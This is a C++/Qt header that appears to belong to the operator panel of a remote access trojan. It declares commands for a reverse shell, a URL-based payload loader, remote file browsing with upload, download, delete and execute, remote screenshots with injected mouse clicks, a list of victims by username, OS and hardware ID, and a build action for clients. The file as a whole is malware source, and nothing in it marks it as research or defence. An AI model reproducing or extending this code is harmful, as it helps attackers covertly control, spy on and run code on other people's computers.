#ifndef MWINDOW_H
#define MWINDOW_H

#include <QMainWindow>
#include <QMessageBox>
#include <QWidget>
#include <QThread>
#include <QFile>
#include <QFileDialog>
#include <QInputDialog>
#include <QPixmap>
#include <QMouseEvent>
#include <QLabel>

#include "sqlite3.h"
#include "winsock.h"

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
Q_GUI_EXPORT QPixmap qt_pixmapFromWinHBITMAP(HBITMAP bitmap, int hbitmapFormat=0);

QT_BEGIN_NAMESPACE
namespace Ui { class MWindow; class ScreenShot; class WScreenShot; class WExplorer; class DisplayLabel; }
QT_END_NAMESPACE

#define CMD_HADSHAKE	0x0
#define CMD_ONLINE		0x1
#define CMD_OTVET_OK	0x2
#define CMD_OTVET_ER	0x3
#define CMD_SCREEN		0x4
#define CMD_LOADER		0x5
#define CMD_SHELL		0x6
#define CMD_EXPLOR		0x7

#define DO_GETCURPATH	0x0
#define DO_SETCURPATH   0x1
#define DO_DOWLDFILE	0x2
#define DO_UPLDFILE		0x3
#define DO_REMFILE		0x4
#define DO_EXEC			0x5

#define DO_CHANDGE_WH	0x1
#define DO_RUNTHREAD	0x2
#define DO_LCLICK       0x3
#define DO_DCLICK       0x4
#define DO_RCLICK       0x5

typedef struct EXPLRR
{
    DWORD IND;
    DWORD DO;
    DWORD SIZEofJSON;
} EXPLRR;

typedef struct CLIENTS
{
    char USERNAME[100];
    char OSVER[100];
    char HWID[100];
} CLIENTS;

typedef struct DLE
{
    char URL[1020];
} DLE;

typedef struct BIGSCREEN
{
    int DO;
    int w;
    int h;
    int RealW;
    int RealH;
    int ClickX;
    int ClickY;
    DWORD ZipSize;
    DWORD Size;
} BIGSCREEN;

typedef struct CMDiDATA
{
    DWORD CMD;
    BYTE DATA[1020];
} CMDiDATA;

class WExplorer : public QWidget
{
    Q_OBJECT
private:
    SOCKET SendingSocket;
public:
    explicit WExplorer(QWidget *parent = nullptr);
    ~WExplorer();
signals:
    void GetCurrPath(int NOMER);
public slots:
    void GetFiles(int NOMER);
    //void Release(QString Json, int NOMER);
    void SetCurrPath(int IDX, int NOMER);
    void DownloadFile(int IDX, int NOMER);
    void UploadFile(int IDX, int NOMER);
    void RemoveFile(int IDX, int NOMER);
    void ExecuteFile(int IDX, int NOMER);
    void sOpenCliMenu(QPoint pos);
    void sOpenSrvMenu(QPoint pos);
private:
    QMenu *menuClient;
    QMenu *menuServer;
    QAction *DowloadFile;
    QAction *ExecFile;
    QAction *DelFile;
    QAction *UplFile;
    Ui::WExplorer *ui;
};

class DisplayLabel : public QLabel
{
Q_OBJECT
signals:
    void mousePressed( const QPoint& );

public:
    DisplayLabel( QWidget* parent = 0, Qt::WindowFlags f = 0 );
    DisplayLabel( const QString& text, QWidget* parent = 0, Qt::WindowFlags f = 0 );

    int NOMER;
    int ClientW;
    int ClientH;

    void mousePressEvent( QMouseEvent* ev );
};

class WScreenShot : public QWidget
{
    Q_OBJECT
private:
    QPixmap pixmap;
public:
    explicit WScreenShot(QWidget *parent = nullptr);
    ~WScreenShot();

    int NOMER;
    int ServerW;
    int ServerH;

signals:
    void ChangeScreen(int NOMER, int w, int h);
public slots:
    void GetBitmap(BYTE *bytes, int NOMER, unsigned int Size, int w, int h, int realw, int realh);
private slots:
    void resizeEvent(QResizeEvent *event);

private:
    Ui::WScreenShot *ui;
};

class WSocket  : public QObject
{
    Q_OBJECT
private:
    typedef NTSTATUS(NTAPI *fRtlDecompressBuffer)
    (
        USHORT CompressionFormat,
        PUCHAR UncompressedBuffer,
        ULONG  UncompressedBufferSize,
        PUCHAR CompressedBuffer,
        ULONG  CompressedBufferSize,
        PULONG FinalUncompressedSize
    );

    typedef NTSTATUS(WINAPI* fRtlGetCompressionWorkSpaceSize)
    (
        USHORT CompressionFormatAndEngine,
        PULONG CompressBufferWorkSpaceSize,
        PULONG CompressFragmentWorkSpaceSize
    );

    typedef NTSTATUS(WINAPI* fRtlCompressBuffer)
    (
        USHORT CompressionFormatAndEngine,
        PUCHAR UncompressedBuffer,
        ULONG  UncompressedBufferSize,
        PUCHAR CompressedBuffer,
        ULONG  CompressedBufferSize,
        ULONG  UncompressedChunkSize,
        PULONG FinalCompressedSize,
        PVOID  WorkSpace
    );

    int LisPort;

    HMODULE ntdll = NULL;
    fRtlGetCompressionWorkSpaceSize pRtlGetCompressionWorkSpaceSize = NULL;
    fRtlCompressBuffer pRtlCompressBuffer = NULL;
    fRtlDecompressBuffer pRtlDecompressBuffer = NULL;

    void InitArchiveFunc();

    BYTE *Decompress(BYTE *compBuffer, \
                     const int compBufferLen, \
                     const int uncompBufferLen, \
                     DWORD *uncompBufferSize);
    BYTE *Compress(BYTE *uncompBuffer, \
                   const DWORD uncompBufferLen, \
                   DWORD compBufferLen, \
                   DWORD *compBufferSize);

    WINBOOL sendInt(SOCKET con, int i);
    WINBOOL recvStat(SOCKET Con);
public:
    SOCKET ListenSocket;
    WSocket(int Port);

public slots:
    void ReversCmd(int NOMER);
    void WaitClient();
    void WaitShell();
    void CheckOnline();
    void Recving(int NOMER);
    void GetScreen(int NOMER);
    void ChangeScreen(int NOMER, int w, int h);
    void Release(QString Json, int NOMER);
    void GetCurrPath(int NOMER);
    void SetCurrPath(int IDX, int NOMER);
    void DownloadFile(int IDX, int NOMER);
    void UploadFile(int IDX, int NOMER);
    void RemoveFile(int IDX, int NOMER);
    void ExecuteFile(int IDX, int NOMER);
signals:
    void AddNewClient(int NOMER, char *IP, char *HWID, char *USERNAME, char *OSVER);
    void DelClient(int NOMER);
    void CloseShell();
    void Release(QString Json);
    void GetBitmap(BYTE *bytes, int NOMER, unsigned int Size, int w, int h, int realw, int realh);
};

class MWindow : public QMainWindow
{
    Q_OBJECT

public:
    MWindow(QWidget *parent = nullptr);
    ~MWindow();
    WScreenShot *screenShot;
    WExplorer *fileExplorer;
    WSocket *wsocket80, *sendHandl, *shellSocket;
    QThread *mainSocketThread, *shellSocketThread, *sendSocketThread;

public slots:
    void sOpenMenu(QPoint pos);
    void sRunShell();
    void sExplorer();
    void sScreen();
    void sLoader();
    void AddNewClient(int NOMER, char *IP, char *HWID, char *USERNAME, char *OSVER);
    void DelClient(int NOMER);
    void CloseShell();

private slots:
    void on_CreateBuild_triggered();
    void on_AddPorts_triggered();
    void on_OpenBD_triggered();
    void on_OnlineRecv_triggered();

signals:
    void ReversCmd(int NOMER);
    void GetFiles(int NOMER);
    void WaitClient();
    void WaitShell();
    void CheckOnline();
    void GetScreen(int NOMER);
    void Recving(int NOMER);

private:
    QMenu *menu;
    QAction *Revershell;
    QAction *Explorer;
    QAction *ScreenShot;
    QAction *Loader;
    Ui::MWindow *ui;
};
#endif // MWINDOW_H
